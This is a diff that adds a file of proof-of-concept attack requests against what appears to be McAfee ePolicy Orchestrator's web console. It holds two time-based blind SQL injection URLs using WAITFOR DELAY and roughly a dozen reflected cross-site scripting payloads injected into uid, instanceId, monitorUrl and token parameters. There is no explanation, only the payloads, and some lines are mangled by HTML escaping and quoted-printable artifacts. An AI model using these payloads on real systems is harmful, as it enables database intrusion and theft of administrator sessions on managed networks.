@@ -1,0 +1,33 @@
+SQL-injection
+=============
+http://www.example.com/core/showRegisteredTypeDetails.do?registeredTypeID=epo.rt.computer&amp;uid= 6waitf or%20delay&#039;0%3a0%3a20&#039;-- &amp;index=0&amp;datasourceID=&amp;orion.user.security.token=2LoWTAOfWJ4ZCjxY&amp;ajax Mode=standard HTTP/1.1 
+
+http://www.example.com/EPOAGENTMETA/DisplayMSAPropsDetail.do?registeredTypeID=epo.rt.computer &amp;uid=1;%20WAITFOR%20DELAY%20&#039;0:0:0&#039;;-- &amp;datasourceID=ListDataSource.orion.dashboard.chart.datasource.core.query Factory %3Aquery.2&amp;index=0 HTTP/1.1
+
+XSS:
+====
+http://www.example.com/core/loadDisplayType.do HTTP/1.1=20
+displayType=text_lookup&amp;operator=eq&amp;propKey=EPOLeafNode.AgentVersion&amp;instanceId=&lt;script&gt;alert(182667)&lt;/script&gt;&amp;orion.user.security.token=ZCFbpCp
+y3ldihsCW&amp;ajaxMode=standard
+ 
+http://www.example.com/console/createDashboardContainer.do HTTP/1.1 displayType=text_lookup&amp;operator=eq&amp;propKey=EPOLeafNode.AgentVersion&amp;instanceId=&lt;script&gt;alert(182667)&lt;/script&gt;&amp;orion.user.security.token=ZCFbpCpy3ldihsCW&amp;ajaxMode=standard
+ 
+http://www.example.com/console/createDashboardContainer.do HTTP/1.1 elementId=3DcustomURL.dashboard.factory3Ainstance&amp;index=3D2&amp;pageid=3D30&amp;width=3D1118&amp;height=3D557&amp;refreshInterval=3D5&amp;refreshIntervalUnit=3DMIN&amp;
+filteringEnabled=3Dfalse&amp;monitorUrl=3Dhttp%3A%2F%2Fwww.xxxx.com&quot;/&gt;&lt;/iframe&gt;&lt;script&gt;alert(111057)&lt;/script&gt;&amp;orion.user.security.token=3D9BslgbJEv2JqQy3k&amp;ajaxMode=3Dstandard
+ 
+http://www.example.com/ComputerMgmt/sysDetPanelBoolPie.do?uid=1&quot;;&lt;/script&gt;&lt;script&gt;alert(147981)&lt;/script&gt;&amp;orion.user.security.token=ZCFbpCpy3ldihsCW&amp;ajaxMode=standardHTTP/1.1
+ 
+http://www.example.com/ComputerMgmt/sysDetPanelQry.do?uid=&lt;script&gt;alert(149031)&lt;/script&gt;&amp;orion
+.user.security.token=ZCFbpCpy3ldihsCW&amp;ajaxMode=standard HTTP/1.1
+ 
+http://www.example.com/ComputerMgmt/sysDetPanelQry.do?uid=&gt;&quot;&#039;&gt;&lt;script&gt;alert(30629)&lt;/script&gt;&amp;or
+ion.user.security.token=&gt;&quot;&#039;&gt;&lt;script&gt;alert(30629)&lt;/script&gt;&amp;ajaxMode=&gt;&quot;&#039;&gt;&lt;
+script&gt;alert(30629)&lt;/script&gt; HTTP/1.1
+ 
+http://www.example.com/ComputerMgmt/sysDetPanelSummary.do?uid=&lt;script&gt;alert(146243)&lt;/script&gt;&amp;o
+rion.user.security.token=ZCFbpCpy3ldihsCW&amp;ajaxMode=standard HTTP/1.1
+ 
+
+http://www.example.com/ComputerMgmt/sysDetPanelSummary.do?uid=&gt;&quot;&#039;&gt;&lt;script&gt;alert(30565)&lt;/script
+&amp;orion.user.security.token=&gt;&quot;&#039;&gt;&lt;script&gt;alert(30565)&lt;/script&gt;&amp;ajaxMode=&gt;&quot;&#039;&gt;&lt;script&gt;alert(30565)&lt;/script&gt; HTTP/1.1
+ 
